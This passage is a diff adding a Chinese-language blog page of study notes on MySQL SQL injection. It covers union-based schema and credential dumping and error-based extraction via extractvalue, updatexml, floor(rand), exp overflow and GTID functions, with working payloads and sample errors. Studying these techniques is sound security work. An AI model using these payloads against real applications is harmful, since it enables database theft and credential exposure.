@@ -1,0 +1,1019 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SQL 注入这方面一直挺菜的，整理一下吧 MySQLUnion Based判断 column 数及回显数据字段位置 order&#x2F;group by N union select 1,2,3...N   注意：  若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面限制了单行数据输出，我们让前边的 select 查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则 SQL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小谈SQL注入">
+<meta property="og:url" content="http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="歪比巴卜">
+<meta property="og:description" content="SQL 注入这方面一直挺菜的，整理一下吧 MySQLUnion Based判断 column 数及回显数据字段位置 order&#x2F;group by N union select 1,2,3...N   注意：  若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面限制了单行数据输出，我们让前边的 select 查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则 SQL">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/zfHIm7y31G5MsZU.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/R6EMWit5lazIePC.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/UCKcN46HYWITbBu.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/XhTW5evptx8EHnC.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/AxWCeFVRBES7plz.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/26/hmOj8uBfU2PEiRq.png">
+<meta property="article:published_time" content="2021-04-26T05:52:52.000Z">
+<meta property="article:modified_time" content="2021-10-31T03:47:44.632Z">
+<meta property="article:author" content="Du1L0v3">
+<meta property="article:tag" content="SQL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/26/zfHIm7y31G5MsZU.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>小谈SQL注入</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<!--
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+-->
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/2021/04/27/%E5%85%B3%E4%BA%8EPHP-AST%E8%BF%99%E4%BB%B6%E4%BA%8B/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&text=小谈SQL注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=小谈SQL注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&is_video=false&description=小谈SQL注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=小谈SQL注入&body=Check out this article: http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=小谈SQL注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=小谈SQL注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=小谈SQL注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=小谈SQL注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&name=小谈SQL注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&t=小谈SQL注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Union-Based"><span class="toc-number">1.1.</span> <span class="toc-text">Union Based</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD-column-%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">判断 column 数及回显数据字段位置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E3%80%81%E8%A1%A8%E3%80%81%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">爆库、表、字段</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Error Based</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-overflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用 overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#bigint-%E6%95%B0%E5%80%BC%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">bigint 数值操作</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-xpath"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用 xpath</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">extractvalue (长度限制32位)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">updatexml (长度限制32位)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%8A%A5%E9%94%99-%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">利用虚拟表报错 &#x2F; 主键重复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">利用几何函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用不存在的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-name-const"><span class="toc-number">1.2.6.</span> <span class="toc-text">利用 name_const</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uuid-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.</span> <span class="toc-text">uuid 相关函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GTID-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.8.</span> <span class="toc-text">GTID 相关函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#join-using-%E6%B3%A8%E5%88%97%E5%90%8D"><span class="toc-number">1.2.9.</span> <span class="toc-text">join using 注列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ST-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.10.</span> <span class="toc-text">ST 相关函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.2.11.</span> <span class="toc-text">报错函数速查表</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blind-Based"><span class="toc-number">1.3.</span> <span class="toc-text">Blind Based</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Boolean%EF%BC%881-or-0%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">Boolean（1 or 0）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Time%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">Time（无回显）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Common-Bypass"><span class="toc-number">1.4.</span> <span class="toc-text">Common Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#and-or"><span class="toc-number">1.4.1.</span> <span class="toc-text">and &#x2F; or</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.4.2.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.4.3.</span> <span class="toc-text">括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%97%E5%8F%B7"><span class="toc-number">1.4.4.</span> <span class="toc-text">逗号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.4.5.</span> <span class="toc-text">其他系统关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4-%E6%8B%A6%E6%88%AA-%E8%BD%AC%E4%B9%89"><span class="toc-number">1.4.6.</span> <span class="toc-text">单双引号被过滤 &#x2F; 拦截 &#x2F; 转义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97"><span class="toc-number">1.4.7.</span> <span class="toc-text">数字</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E5%AE%83"><span class="toc-number">1.5.</span> <span class="toc-text">其它</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-number">1.5.1.</span> <span class="toc-text">注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">常用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">运算符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">系统信息函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">进制转换</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%88%AA%E5%8F%96-%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">字符截取&#x2F;拼接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">常见全局变量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.5.2.6.</span> <span class="toc-text">其他常用函数 &#x2F; 语句</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        小谈SQL注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Du1L0v3</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-04-26T05:52:52.000Z" itemprop="datePublished">2021-04-26</time>
+        
+        (Updated: <time datetime="2021-10-31T03:47:44.632Z" itemprop="dateModified">2021-10-31</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%99%BA%E6%85%A7%E7%9A%84%E6%94%B6%E8%97%8F/">智慧的收藏</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/SQL/" rel="tag">SQL</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>SQL 注入这方面一直挺菜的，整理一下吧</p>
+<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h3><h4 id="判断-column-数及回显数据字段位置"><a href="#判断-column-数及回显数据字段位置" class="headerlink" title="判断 column 数及回显数据字段位置"></a>判断 column 数及回显数据字段位置</h4><ul>
+<li><code>order/group by N</code></li>
+<li><code>union select 1,2,3...N</code></li>
+</ul>
+<hr>
+<p>注意：</p>
+<ul>
+<li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面限制了单行数据输出，我们让前边的 select 查询条件返回结果为空即可</li>
+<li>注意一定要拼接够足够的字段数，否则 SQL 语句报错。PS：此方法也可作为判断前条 select 语句的方法之一</li>
+</ul>
+<hr>
+<h4 id="爆库、表、字段"><a href="#爆库、表、字段" class="headerlink" title="爆库、表、字段"></a>爆库、表、字段</h4><ul>
+<li><p>MySQL version &lt; 5.0</p>
+<ul>
+<li><p>由于 MySQL 的低版本缺乏系统库<code>information_schema</code>，故通常情况下，我们无法直接查询表名，字段（列）名等信息</p>
+<p>这时候只能靠猜来解决，直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据</p>
+<p>若知道仅表名而不知道列（字段）名，可以尝试：</p>
+<ul>
+<li><p>单字段：<code>select *,1,2,xxx from table_name</code></p>
+</li>
+<li><p>多字段：<code>select x from(select 1,2,3,4,xxx from table_name union select * from table_name)a</code></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>MySQL version &gt;= 5.0</p>
+<ul>
+<li><p>爆 schema</p>
+<ul>
+<li><code>union select 1,2,schema_name from information_schema.schemata limit 1,1</code></li>
+</ul>
+</li>
+<li><p>爆 table</p>
+<ul>
+<li><p><code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</code></p>
+</li>
+<li><p><code>union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1</code></p>
+</li>
+</ul>
+</li>
+<li><p>爆 column</p>
+<ul>
+<li><code>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;Du1&#39;</code></li>
+<li><code>union select 1,2,column_name from information_schema.columns where table_schema=database() limit 0,1</code></li>
+</ul>
+</li>
+<li><p>出</p>
+<ul>
+<li><code>select heart from Du1</code></li>
+<li><code>SELECT CONCAT(username, &quot;:&quot; ,password) FROM Du1.USER</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h3><p>通过特殊函数的报错使其参数被页面输出</p>
+<hr>
+<p>前提：</p>
+<ul>
+<li>服务器开启报错信息返回，也就是发生错误时返回报错信息</li>
+</ul>
+<p>注意：</p>
+<ul>
+<li>报错函数通常有最长报错输出的限制，面对这种情况，可以进行分割输出<ul>
+<li><code>#define ERRMSGSIZE (512)</code></li>
+</ul>
+</li>
+<li>特殊函数的特殊参数进运行一个字段、一行数据的返回，使用 group_concat 等函数聚合数据即可</li>
+</ul>
+<hr>
+<h4 id="利用-overflow"><a href="#利用-overflow" class="headerlink" title="利用 overflow"></a>利用 overflow</h4><p>注：MySQL version &gt; 5.5.5 的时候 overflow 才会有错误讯息，MySQL version &gt; 5.5.53 的时候不会显示查询结果</p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p>适用版本：5.5.49~5.5.5</p>
+<p>该函数会返回 e 的 x 次方结果</p>
+<p>因为 MySQL 能记录的 double 数值范围有限，一旦结果超过范围，则该函数报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(709) &#x3D;&gt; 8.218407461554972e307</span><br><span class="line">SELECT exp(710) &#x3D;&gt; ERROR</span><br></pre></td></tr></table></figure>
+
+<p>故可作 payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(~(SELECT * FROM (SELECT user())x));</span><br><span class="line">ERROR 1690(22003): DOUBLE value is out of range in &#39;exp(~((SELECT &#39;root@localhost&#39; FROM dual)))&#39;</span><br></pre></td></tr></table></figure>
+
+<p>按理来说 <code>pow</code> 应该也可以，原理相同</p>
+<hr>
+<h5 id="bigint-数值操作"><a href="#bigint-数值操作" class="headerlink" title="bigint 数值操作"></a>bigint 数值操作</h5><p>利用了当 MySQL 数据库的某些边界数值进行数值运算时，会报错的原理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT ~0 &#x3D;&gt; 18446744073709551615</span><br><span class="line">SELECT ~0 + 1 &#x3D;&gt; ERROR</span><br><span class="line">SELECT cot(0) &#x3D;&gt; ERROR</span><br><span class="line"></span><br><span class="line">select !(select * from(select user())a)-~0;</span><br><span class="line">select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用-xpath"><a href="#利用-xpath" class="headerlink" title="利用 xpath"></a>利用 xpath</h4><h5 id="extractvalue-长度限制32位"><a href="#extractvalue-长度限制32位" class="headerlink" title="extractvalue (长度限制32位)"></a>extractvalue (长度限制32位)</h5><p>原理：前后添加 ~ 使其不符合 xpath 格式从而报错</p>
+<p>适用版本 5.1.5+</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure>
+
+<h5 id="updatexml-长度限制32位"><a href="#updatexml-长度限制32位" class="headerlink" title="updatexml (长度限制32位)"></a>updatexml (长度限制32位)</h5><p>适用版本 5.1.5+</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用虚拟表报错-主键重复"><a href="#利用虚拟表报错-主键重复" class="headerlink" title="利用虚拟表报错 / 主键重复"></a>利用虚拟表报错 / 主键重复</h4><p>原理：简单来说，是由于 where 条件每执行一次，rand 函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故 <code>rand()</code> 不能后接在<code>order/group by</code> 上</p>
+<hr>
+<p>举栗子：</p>
+<p>假设 USER 表有三条数据，我们通过：<code>select * from USER group by username</code> 来通过其中的 username 字段进行分组</p>
+<p>此过程会先建立一个虚拟表，存在两个字段：<code>key，count</code></p>
+<p>其中我们通过 username 来判断，其在此处是字段，首先先取第一行的数据：<code>username=Du1&amp;password=0312</code></p>
+<p>username 为 Du1 出现一次，则现在虚表内查询是否存在 Du1，若存在，则 count + 1，若不存在，则添加 Du1，其 count 为 1</p>
+<p>对于<code>floor(rand(0)*2)</code>，其中<code>rand()</code>函数，会生成 0 ~ 1 之间随机一个小数、<code>floor()</code>取整数部分、0 是随机因子、乘 2 是为了让大于 0.5 的小数通过 floor 函数得 1</p>
+<p>若表中有三行数据：我们通过<code>select * from USER group by floor(rand(0)*2)</code>进行排序的话</p>
+<blockquote>
+<p>注意：</p>
+<p>由于<code>rand(0)</code>的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011……</p>
+</blockquote>
+<p>首先<code>group by</code>需要执行的话，需要确定分组因子，故<code>floor(rand(0)*2)</code>被执行一次，得到的结果为 0，接着在虚表内检索 0，发现虚表没有键值为 0 的记录，故添加上，在进行添加时：<code>floor(rand(0)*2)</code>第二次被执行，得到结果 1，于是虚拟表插入的内容为<code>key=1&amp;count=1</code></p>
+<p>第二次执行<code>group by</code>时：<code>floor(rand(0)*2)</code>先被运行一次，也就是第三次运行。得到结果 1，查询虚表发现数据存在，因而直接让虚表内的<code>key=1</code>的 count 加一即可，<code>floor(..)</code>只运行了一次</p>
+<p>第三次执行<code>group by</code>时，<code>floor(rand(0)*2)</code>被执行第四次，得到结果 0，查询虚表不存在。再插入虚表时，<code>floor(…)</code>被执行第五次，得到结果 1，故此时虚表将插入的值为<code>key=1&amp;count=1</code>，注意，此时虚表已有一条记录为：<code>key=1&amp;count=2</code>，并且字段 key 为主键，具有不可重复性，故虚表在尝试插入时将产生错误</p>
+<hr>
+<p>故可作 payload：<code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p>
+<p><img src="https://i.loli.net/2021/04/26/zfHIm7y31G5MsZU.png"></p>
+<p><code>select count(*) from test group by concat(version(),floor(rand(0)*2));</code></p>
+<p><img src="https://i.loli.net/2021/04/26/R6EMWit5lazIePC.png"></p>
+<h4 id="利用几何函数"><a href="#利用几何函数" class="headerlink" title="利用几何函数"></a>利用几何函数</h4><ul>
+<li>GeometryCollection：<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li>
+<li>polygon：<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li>
+<li>multipoint：<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li>
+<li>multilinestring：<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li>
+<li>linestring：<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li>
+<li>multipolygon：<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li>
+</ul>
+<h4 id="利用不存在的函数"><a href="#利用不存在的函数" class="headerlink" title="利用不存在的函数"></a>利用不存在的函数</h4><p>随便用一个不存在的函数，可能会摸奖得到当前所在的数据库名称</p>
+<p><img src="https://i.loli.net/2021/04/26/UCKcN46HYWITbBu.png"></p>
+<h4 id="利用-name-const"><a href="#利用-name-const" class="headerlink" title="利用 name_const"></a>利用 name_const</h4><p>仅可取数据库版本信息</p>
+<p>payload：<code>select * from(select name_const(version(),0x1),name_const(version(),0x1))a</code></p>
+<p><img src="https://i.loli.net/2021/04/26/XhTW5evptx8EHnC.png"></p>
+<h4 id="uuid-相关函数"><a href="#uuid-相关函数" class="headerlink" title="uuid 相关函数"></a>uuid 相关函数</h4><p>适用版本：8.0.x</p>
+<p>because of 参数格式不正确</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT UUID_TO_BIN((SELECT password FROM users WHERE id&#x3D;1));</span><br><span class="line">SELECT BIN_TO_UUID((SELECT password FROM users WHERE id&#x3D;1));</span><br></pre></td></tr></table></figure>
+
+<p>这个👴还没测</p>
+<h4 id="GTID-相关函数"><a href="#GTID-相关函数" class="headerlink" title="GTID 相关函数"></a>GTID 相关函数</h4><p>同样也是参数格式不正确。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select gtid_subset(user(),1);</span><br><span class="line">select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);</span><br><span class="line">select gtid_subtract((select * from(select user())a),1);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/04/26/AxWCeFVRBES7plz.png"></p>
